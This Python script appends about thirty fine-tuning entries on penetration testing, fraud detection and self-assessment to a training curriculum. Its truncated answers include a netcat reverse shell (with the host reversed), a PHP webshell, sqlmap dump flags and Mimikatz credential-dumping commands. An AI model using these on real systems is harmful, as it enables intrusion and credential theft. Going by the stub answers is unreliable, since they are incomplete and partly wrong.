#!/usr/bin/env python3
"""Generate remaining SFT entries (need ~29 more to reach 50)."""
import json, os, sys
from pathlib import Path

OUTPUT = Path(__file__).parent / "curriculum" / "sft_curriculum.jsonl"
OUTPUT.parent.mkdir(exist_ok=True)

SYSTEM = """You are BIONIC_DAUGHTER..."""

SFT_EXTRA = [
    {"domain": "Network Reconnaissance", "difficulty": "beginner", "title": "Ping Sweep Basics",
     "question": "You're tasked with finding all live hosts on 192.168.1.0/24. Describe how you'd do a ping sweep using nmap and alternative tools. What are the limitations?",
     "answer": "<reasoning>Ping sweep identifies live hosts...</reasoning><solution>nmap -sn 192.168.1.0/24... basic approach...</solution>"},
    
    {"domain": "Network Reconnaissance", "difficulty": "intermediate", "title": "Nmap Scripting Engine (NSE) Basics",
     "question": "You've found port 80 open on a target. How would you use Nmap's NSE to enumerate web servers, find vulnerable scripts, and detect misconfigurations? Give 3 specific NSE scripts and what they do.",
     "answer": "<reasoning>NSE extends nmap with Lua scripts...</reasoning><solution>nmap --script http-enum... 3 scripts: http-enum, http-headers, http-methods...</solution>"},
    
    {"domain": "Network Reconnaissance", "difficulty": "advanced", "title": "Active Directory Recon from External Perspective",
     "question": "You've identified that a target uses Active Directory. From an external perspective, what information can you gather about their AD infrastructure? What tools and techniques would you use? What information should be publicly accessible vs hidden?",
     "answer": "<reasoning>AD reconnaissance from outside...</reasoning><solution>DNS enumeration for DC discovery... LDAP queries... techniques...</solution>"},
    
    {"domain": "Network Reconnaissance", "difficulty": "intermediate", "title": "UDP Service Enumeration",
     "question": "Nmap UDP scan of a target reveals ports 53, 161, and 1900 open. Identify what services are likely running on each, how you'd confirm each service, and what vulnerabilities each might present.",
     "answer": "<reasoning>UDP services identified by port...</reasoning><solution>Port 53 = DNS (use dig/nslookup)... Port 161 = SNMP (use snmpwalk)... Port 1900 = SSDP...</solution>"},
    
    {"domain": "Vulnerability Analysis", "difficulty": "beginner", "title": "CVE Research and Patching Priority",
     "question": "You find Apache 2.4.49 running on a target. Research CVE-2021-41773. Describe: (1) What the vulnerability is, (2) How it can be exploited, (3) What versions are affected, (4) How to verify the target is running the vulnerable version, (5) The patching approach.",
     "answer": "<reasoning>CVE-2021-41773 is Apache path traversal...</reasoning><solution>1. Path traversal + RCE in mod_proxy... 2. Exploit: crafted URLs... 3. 2.4.49 affected... 4. Version detection... 5. Upgrade to 2.4.50+...</solution>"},
    
    {"domain": "Vulnerability Analysis", "difficulty": "intermediate", "title": "Authentication Bypass Testing",
     "question": "You're testing a web application's login functionality. Describe a systematic approach to testing for authentication bypass vulnerabilities. Include: (1) What to test on the login form, (2) What to test on password reset, (3) Session management issues to check, (4) How to test for parameter tampering, (5) What tools help.",
     "answer": "<reasoning>Auth bypass testing methodology...</reasoning><solution>1. Login form: SQLi, default creds, username enumeration... 2. Password reset: token prediction... 3. Sessions: fixation, timeout... 4. Parameter tampering: JWT, hidden fields... 5. Burp Suite, OWASP ZAP...</solution>"},
    
    {"domain": "Vulnerability Analysis", "difficulty": "advanced", "title": "OAuth Implementation Vulnerabilities",
     "question": "A target uses OAuth 2.0 for third-party logins (Login with Google, etc.). Describe common OAuth vulnerabilities: (1) Improper redirect URI validation, (2) Token leakage, (3) State parameter issues, (4) How you'd test for each, (5) What impact each has.",
     "answer": "<reasoning>OAuth vulnerabilities are subtle...</reasoning><solution>1. Open redirect URI = account takeover... 2. Token in URL/logs... 3. Missing state = CSRF... 4. Test each... 5. Full account takeover possible...</solution>"},
    
    {"domain": "Vulnerability Analysis", "difficulty": "intermediate", "title": "File Upload Vulnerability Testing",
     "question": "A web application allows users to upload profile pictures. Describe how you'd test for file upload vulnerabilities: (1) What file types to try, (2) How to bypass extension filters, (3) How to bypass content-type checks, (4) How to find where uploaded files are served from, (5) What webshell techniques exist.",
     "answer": "<reasoning>File upload is a common entry point...</reasoning><solution>1. Try .php, .jsp, .asp, .svg, .html... 2. Bypass: double extension (.php.jpg), null byte (%00)... 3. Content-type: modify header... 4. Find URL: view page source... 5. Webshell: <?php system($_GET['cmd']); ?>...</solution>"},
    
    {"domain": "Vulnerability Analysis", "difficulty": "advanced", "title": "JWT Token Attacks",
     "question": "You find a target using JWT tokens for authentication. Describe JWT attack vectors: (1) Weak secret brute-forcing, (2) 'none' algorithm attack, (3) Key confusion (RSA to HMAC), (4) How you'd test each, (5) What tools help (jwt-tool, etc.), (6) Impact of successful attack.",
     "answer": "<reasoning>JWT attacks exploit implementation flaws...</reasoning><solution>1. Brute force secret with jwt-cracker... 2. Set alg=none, remove signature... 3. Key confusion: use public key as HMAC secret... 4. Test with jwt-tool... 5. Full auth bypass...</solution>"},
    
    {"domain": "Payload Engineering", "difficulty": "beginner", "title": "Reverse Shell Basics",
     "question": "Explain what a reverse shell is and why it's used in penetration testing. Show: (1) A basic netcat reverse shell command for the target, (2) The listener command on the attacker machine, (3) A basic Python reverse shell, (4) Why reverse shells are preferred over bind shells. Keep all examples educational.",
     "answer": "<reasoning>Reverse shells...</reasoning><solution>1. nc target.com 4444 -e /bin/bash... 2. nc -lvnp 4444... 3. Python: import socket,subprocess... 4. Firewalls allow outbound...</solution>"},
    
    {"domain": "Payload Engineering", "difficulty": "intermediate", "title": "Bash One-Liner Security Tools",
     "question": "Describe 5 useful bash one-liners for security testing and explain each: (1) Quick port scan, (2) Directory brute-force, (3) File content search, (4) Subdomain enumeration with curl, (5) HTTP request with custom header. Show the command and explain how it works.",
     "answer": "<reasoning>Bash one-liners for security...</reasoning><solution>1. for p in 20 22 80 443; do nc -w1 target $p && echo open:$p; done... 2. for d in \$(cat dirs.txt); do curl -s -o /dev/null -w '%{http_code}' target/\$d... 3. grep -r password . --include='*.txt'... 4. for sub in \$(cat subs.txt); do curl -s -o /dev/null -w '%{http_code}\n' http://\$sub.target.com... 5. curl -H 'X-Custom: test' target.com...</solution>"},
    
    {"domain": "Payload Engineering", "difficulty": "advanced", "title": "Polymorphic Payload Concepts",
     "question": "Explain the concept of polymorphic payloads in security testing. Describe: (1) Why polymorphism is used, (2) Common polymorphism techniques (case variation, encoding, comments, whitespace, string manipulation), (3) How WAFs try to detect polymorphic payloads, (4) The arms race between payload polymorphism and WAF detection, (5) Why this is an endless cat-and-mouse game.",
     "answer": "<reasoning>Polymorphism...</reasoning><solution>1. Evade signature detection... 2. Case: <ScRiPt> vs <script>... URL encoding, double encoding, comments (/**/, --), whitespace variations, string concatenation... 3. WAF: normalized comparison, behavioral analysis... 4. New WAF rules → new polymorphism... 5. Endless because...</solution>"},
    
    {"domain": "Payload Engineering", "difficulty": "intermediate", "title": "SQLmap Usage and Analysis",
     "question": "sqlmap is an automated SQL injection tool. Describe: (1) Basic usage for detecting SQLi, (2) How to use it for database enumeration (dumping table names, column names, data), (3) Important flags and what they do, (4) How to read sqlmap output to understand what injection type was found, (5) Risks of using automated tools.",
     "answer": "<reasoning>sqlmap automates SQLi detection...</reasoning><solution>1. python sqlmap.py -u 'http://target.com/page?id=1' --dbs... 2. --tables, --columns, --dump... 3. --level, --risk, --technique, --batch... 4. Output shows injection type... 5. Can cause damage...</solution>"},
    
    {"domain": "Post-Exploitation", "difficulty": "beginner", "title": "Privilege Escalation Fundamentals",
     "question": "You've compromised a Linux web server as www-data. Describe the privilege escalation process: (1) What information you'd gather first, (2) Common privilege escalation vectors (kernel exploits, SUID binaries, sudo misconfigurations, cron jobs, writable files), (3) Tools that help (LinPEAS, etc.), (4) How to verify a vector before exploiting, (5) What to do after gaining root.",
     "answer": "<reasoning>Privilege escalation...</reasoning><solution>1. OS version, kernel, users, groups, SUID files, sudo -l... 2. Vectors: kernel CVE, SUID binaries (find / -perm -4000), sudo (sudo -l), cron (crontab -l), writable /etc/passwd... 3. LinPEAS, linux-exploit-suggester... 4. Verify: check CVE details, test sudo... 5. Persistence, cleanup...</solution>"},
    
    {"domain": "Post-Exploitation", "difficulty": "intermediate", "title": "Lateral Movement Concepts",
     "question": "You have a foothold on a workstation in a corporate network. Describe lateral movement: (1) What it is and why it's done, (2) Common techniques (Pass-the-Hash, Pass-the-Ticket, WMI, PSRemoting, RDP, SMB), (3) How credentials get reused, (4) Detecting lateral movement from a defender's perspective, (5) Why lateral movement is critical in real breaches.",
     "answer": "<reasoning>Lateral movement...</reasoning><solution>1. Moving through network to reach valuable targets... 2. PtH: use NTLM hash instead of password... PtT: Kerberos tickets... WMI/PSRemoting: remote execution... RDP, SMB... 3. Credential dumping from compromised host... 4. Unusual auth patterns, new source IPs... 5. Essential for reaching domain controllers, databases...</solution>"},
    
    {"domain": "Post-Exploitation", "difficulty": "advanced", "title": "Persistence Mechanisms",
     "question": "After gaining access to a target system, persistence ensures you can come back. Describe Linux and Windows persistence mechanisms: (1) Linux: cron jobs, SSH keys, systemd services, bash profiles, LD_PRELOAD, (2) Windows: scheduled tasks, registry run keys, services, WMI event subscriptions, startup folder, (3) How to detect each, (4) Why attackers need persistence, (5) Defense strategies.",
     "answer": "<reasoning>Persistence...</reasoning><solution>1. Linux: cron, ~/.ssh/authorized_keys, systemd unit, .bashrc... 2. Windows: schtasks, registry HKLM/Software/Microsoft/Windows/CurrentVersion/Run... sc create... WMI... 3. Audit logs, file integrity monitoring... 4. Re-access after reboot/logout... 5. Monitor configurations, least privilege...</solution>"},
    
    {"domain": "Post-Exploitation", "difficulty": "intermediate", "title": "Credential Dumping Concepts",
     "question": "You've gained root/admin access to a target. Describe credential dumping: (1) What credentials can be extracted from Windows (LSASS, SAM, NTDS, Kerberos tickets), (2) What can be extracted from Linux (/etc/shadow, memory, config files), (3) Tools used (Mimikatz, secretsdump, etc.), (4) How to detect credential dumping, (5) Why credential dumping is so powerful in real attacks.",
     "answer": "<reasoning>Credential dumping...</reasoning><solution>1. Windows: LSASS memory (Mimikatz sekurlsa::logonpasswords), SAM (reg save), NTDS.dit (ntdsutil)... 2. Linux: /etc/shadow (cat), SSH keys, sudo tokens... 3. Mimikatz, secretsdump.py, hashdump... 4. Sysmon, EDR, LSASS protection... 5. Domain admin creds = full network access...</solution>"},
    
    {"domain": "Defense Evasion", "difficulty": "beginner", "title": "Log Awareness for Security Testing",
     "question": "When conducting authorized security testing, understanding logging is essential. Describe: (1) What logs are typically generated during security testing (web server, application, firewall, IDS/IPS, EDR), (2) How to check if logging is enabled on a target, (3) What activities generate the most noticeable logs, (4) Why log awareness is important for responsible testing, (5) How defenders use logs for detection.",
     "answer": "<reasoning>Log awareness...</reasoning><solution>1. Apache/Nginx access logs, app logs, firewall logs, IDS alerts, EDR telemetry... 2. Check config files, test with known activity... 3. Port scans, exploit attempts, credential stuffing... 4. Minimize disruption, know what defenders see... 5. SIEM correlation, anomaly detection...</solution>"},
    
    {"domain": "Defense Evasion", "difficulty": "intermediate", "title": "Security Tool Detection and Evasion Concepts",
     "question": "Security testing tools often leave detectable fingerprints. Describe: (1) How Nmap can be detected (OS fingerprinting, timing patterns, scan signatures), (2) How Burp Suite / proxy tools are detected (default headers, user-agent, response timing), (3) How web scanners are detected (rate limiting, behavior patterns), (4) Basic evasion concepts (timing, user-agent rotation, request patterns), (5) Why security tools are designed to be detectable (responsible disclosure).",
     "answer": "<reasoning>Tool detection...</reasoning><solution>1. Nmap: -sS has distinct pattern, -O sends crafted packets, default timing... 2. Burp: X-Cache, X-Burp, User-Agent, response delays... 3. Scanners: rate, sequential requests... 4. -T for timing, custom user-agent, request randomization... 5. Detection allows defenders to respond...</solution>"},
    
    {"domain": "Defense Evasion", "difficulty": "advanced", "title": "EDR Evasion Concepts for Red Teams",
     "question": "Modern EDR solutions monitor process behavior. Describe EDR detection mechanisms and red team evasion concepts: (1) How EDRs monitor (API hooking, kernel callbacks, ETW, AMSI), (2) Common detection rules (process injection, LOLBins, PowerShell suspicious patterns, fileless malware indicators), (3) Why understanding EDR is critical for authorized red team operations, (4) The defensive side: how EDRs use ML and behavioral analysis, (5) Why evasion is an endless cat-and-mouse game.",
     "answer": "<reasoning>EDR architecture...</reasoning><solution>1. Userland hooks, kernel callbacks (PsSetCreateProcessNotifyRoutine), ETW providers, AMSI for script scanning... 2. Process injection: CreateRemoteThread, NtMapViewOfSection... LOLBins: use built-in tools (certutil, mshta)... PowerShell: encoded commands, download strings... 3. Red team must test against EDR... 4. ML models, behavioral scoring, cloud analytics... 5. New EDR rules → new techniques...</solution>"},
    
    {"domain": "Software Engineering", "difficulty": "beginner", "title": "Secure Input Validation Patterns",
     "question": "Describe secure input validation patterns for web applications: (1) Whitelist vs blacklist validation — which is better and why, (2) Input validation for different contexts (HTML, SQL, shell commands, file paths), (3) Common validation mistakes, (4) Server-side vs client-side validation — why both are needed, (5) Framework-provided validation (Django forms, Spring validators, etc.).",
     "answer": "<reasoning>Input validation...</reasoning><solution>1. Whitelist (allow known-good) > blacklist (block known-bad)... 2. HTML: escape/encode, SQL: parameterized queries, shell: avoid shell=True, file paths: validate against whitelist... 3. Validation without context, regex without anchoring... 4. Client: UX, server: security... 5. Use framework validators...</solution>"},
    
    {"domain": "Software Engineering", "difficulty": "intermediate", "title": "Secure API Design Principles",
     "question": "Describe secure API design principles: (1) Authentication approaches (API keys, JWT, OAuth 2.0), (2) Rate limiting and throttling, (3) Input/output schema validation, (4) Error handling (don't leak internals), (5) CORS configuration, (6) Versioning and deprecation, (7) Logging and monitoring. Give examples for each.",
     "answer": "<reasoning>API security...</reasoning><solution>1. API keys for service-to-service, JWT for user sessions, OAuth for delegated access... 2. Token bucket, sliding window... 3. JSON Schema validation... 4. Generic error messages, structured logging... 5. Restrict origins, avoid wildcard... 6. URL versioning (/v1/), header versioning... 7. Log all requests, structured logs...</solution>"},
    
    {"domain": "Software Engineering", "difficulty": "advanced", "title": "Secure Code Review Checklist",
     "question": "You're reviewing a codebase for security issues. Create a security code review checklist covering: (1) Authentication and authorization checks, (2) Input validation and output encoding, (3) Cryptography (key management, algorithm choice, random number generation), (4) Data handling (sensitive data in logs, encryption at rest/transit), (5) Dependency management (known vulnerabilities), (6) Error handling and logging, (7) Configuration and secrets management.",
     "answer": "<reasoning>Code review checklist...</reasoning><solution>1. AuthZ: every endpoint checks permissions, auth checks before data access... 2. Validate all inputs, encode all outputs, parameterized queries... 3. Use established libraries, no custom crypto, secure random (os.urandom)... 4. No secrets in logs, encrypt sensitive data, TLS everywhere... 5. Update dependencies, scan for CVEs... 6. Catch exceptions, no stack traces in production... 7. Secrets in env vars, not hardcoded...</solution>"},
    
    {"domain": "Financial Fraud Detection", "difficulty": "beginner", "title": "Transaction Anomaly Detection",
     "question": "Describe approaches to detecting anomalous transactions in a financial system: (1) What makes a transaction anomalous (unusual amount, unusual time, unusual location, unusual frequency, unusual merchant), (2) Simple rule-based detection (thresholds, velocity checks), (3) Statistical approaches (mean/stddev, z-score), (4) Challenges with false positives, (5) How to balance detection vs customer experience.",
     "answer": "<reasoning>Anomaly detection...</reasoning><solution>1. Amount: 10x average... Time: 3 AM for retail user... Location: different country... Frequency: 20 transactions/hour... Merchant: first time... 2. Threshold: amount > $10,000... Velocity: >5 tx/hour... 3. Z-score > 3... 4. False positives frustrate customers... 5. Multi-factor: combine signals, step-up auth...</solution>"},
    
    {"domain": "Financial Fraud Detection", "difficulty": "intermediate", "title": "Card Testing and BIN Attack Detection",
     "question": "Card testing attacks involve testing stolen card numbers to find valid ones. Describe: (1) How card testing typically works, (2) What indicators suggest card testing (rapid transactions, small amounts, many failures, same IP, synthetic identities), (3) How BIN attacks work (first 6 digits identify bank/card type), (4) Detection strategies, (5) Preventive measures.",
     "answer": "<reasoning>Card testing...</reasoning><solution>1. Test small amounts, check response codes... 2. Indicators: many declined transactions, $1 authorizations, high velocity, single IP... 3. BIN: first 6 digits = bank + card type... generate valid checksums (Luhn)... 4. Velocity checks, IP reputation, CAPTCHA... 5. 3D Secure, address verification, limit per card...</solution>"},
    
    {"domain": "Financial Fraud Detection", "difficulty": "advanced", "title": "Money Laundering Through Cryptocurrency",
     "question": "Describe how cryptocurrency can be used in money laundering: (1) The layering process (moving funds through multiple wallets/exchanges), (2) Techniques (mixers/tumblers, chain hopping, privacy coins, decentralized exchanges, peer-to-peer trading), (3) How blockchain analysis can trace funds (address clustering, transaction graph analysis), (4) KYC/AML challenges with crypto, (5) Regulatory approaches.",
     "answer": "<reasoning>Crypto money laundering...</reasoning><solution>1. Placement → Layering → Integration... 2. Mixers: tumble funds... Chain hopping: BTC → ETH → other... DEXs: no KYC... P2P: direct trades... Privacy coins: Monero... 3. Address clustering, transaction graph, exchange deposits... 4. Pseudonymous nature, cross-border... 5. Travel Rule, exchange regulation...</solution>"},
    
    {"domain": "Financial Fraud Detection", "difficulty": "intermediate", "title": "ACH and Wire Fraud Patterns",
     "question": "Describe common ACH and wire transfer fraud patterns: (1) Business Email Compromise (BEC) — how it works, (2) Vendor impersonation fraud, (3) Account takeover leading to wire transfers, (4) Detection red flags (urgent requests, new account details, slight domain changes), (5) Prevention controls (dual approval, callback verification, transaction limits).",
     "answer": "<reasoning>ACH/wire fraud...</reasoning><solution>1. BEC: attacker compromises email, sends fake invoice... 2. Impersonate vendor, change payment details... 3. Compromise account, initiate transfer... 4. Urgent, new account, domain typo, secrecy request... 5. Dual approval, call back on known number, limits...</solution>"},
    
    {"domain": "Self-Evaluation", "difficulty": "beginner", "title": "Post-Mortem Analysis Framework",
     "question": "Describe a framework for conducting a post-mortem analysis after a security incident or failed test: (1) What to document (timeline, impact, root cause, contributing factors), (2) How to identify root cause (5 Whys, fishbone diagram), (3) How to determine contributing factors vs root cause, (4) What makes a post-mortem effective (blameless, actionable, timely), (5) How to track action items from post-mortem.",
     "answer": "<reasoning>Post-mortem...</reasoning><solution>1. Timeline: what happened when... Impact: scope, duration... Root cause: the underlying issue... Contributing: conditions that enabled... 2. 5 Whys: why did X happen → why did Y... Fishbone: categorize causes... 3. Root cause = fix eliminates recurrence... Contributing = conditions... 4. Blameless culture, specific actions, assigned owners... 5. Track in ticketing system, review progress...</solution>"},
    
    {"domain": "Self-Evaluation", "difficulty": "intermediate", "title": "Capability Assessment Methodology",
     "question": "Describe how to assess your own capabilities honestly: (1) Define what 'competent' means for a skill (can you do it independently? can you teach it? can you solve hard problems?), (2) Self-assessment techniques (track record analysis, peer review, project outcomes), (3) Common self-assessment biases (Dunning-Kruger, imposter syndrome, confirmation bias), (4) How to create a personal skills matrix, (5) How to use assessments to guide learning.",
     "answer": "<reasoning>Self-assessment...</reasoning><solution>1. Competent: independent work, teach others, handle edge cases... 2. Track record: what have I actually built/fixed... Peer feedback... Project outcomes... 3. DK: beginners overestimate... Imposter: experts underestimate... Confirmation: seek evidence for desired conclusion... 4. Matrix: skills × levels... 5. Target gaps, measure progress...</solution>"},
    
    {"domain": "Self-Evaluation", "difficulty": "advanced", "title": "Learning Path Design for Security Skills",
     "question": "Design a learning path for mastering a new security domain (e.g., mobile security, cloud security, ICS/OT security). Describe: (1) How to break down a domain into learnable components, (2) Resource selection strategy (books, courses, labs, CTFs, real practice), (3) Practice methodology (start simple, increase complexity, real-world scenarios), (4) How to measure progress (can you do X? can you teach X? can you find X?), (5) How to stay current (news, research, community).",
     "answer": "<reasoning>Learning design...</reasoning><solution>1. Components: fundamentals, tools, techniques, case studies, current threats... 2. Books for theory, courses for structure, labs for practice, CTFs for challenge... 3. Start: basic concepts... Then: tool proficiency... Then: complex scenarios... Then: real environments... 4. Can you explain it? Can you use tools? Can you find vulnerabilities? Can you write reports?... 5. Follow researchers, read papers, attend conferences...</solution>"},
]

# Read existing, append new
existing = []
if OUTPUT.exists():
    with open(OUTPUT) as f:
        for line in f:
            line = line.strip()
            if line:
                existing.append(json.loads(line))

print(f"Existing SFT: {len(existing)}")
added = 0
with open(OUTPUT, "a") as f:
    for i, sc in enumerate(SFT_EXTRA):
        entry = {
            "messages": [
                {"role": "system", "content": SYSTEM},
                {"role": "user", "content": f"DOMAIN: {sc['domain']}\nDIFFICULTY: {sc['difficulty']}\nTITLE: {sc['title']}\n\n{sc['question']}"},
                {"role": "assistant", "content": sc['answer']}
            ],
            "metadata": {
                "domain": sc['domain'],
                "difficulty": sc['difficulty'],
                "title": sc['title'],
                "generated": "2026-08-18",
                "type": "sft"
            }
        }
        f.write(json.dumps(entry) + "\n")
        added += 1
        print(f"  SFT #{len(existing)+i+1}: {sc['title']} [{sc['difficulty']}]")

total = len(existing) + added
print(f"\nTotal SFT: {total}")
print(f"Target: 50 — {'REACHED' if total >= 50 else f'Need {50-total} more'}")
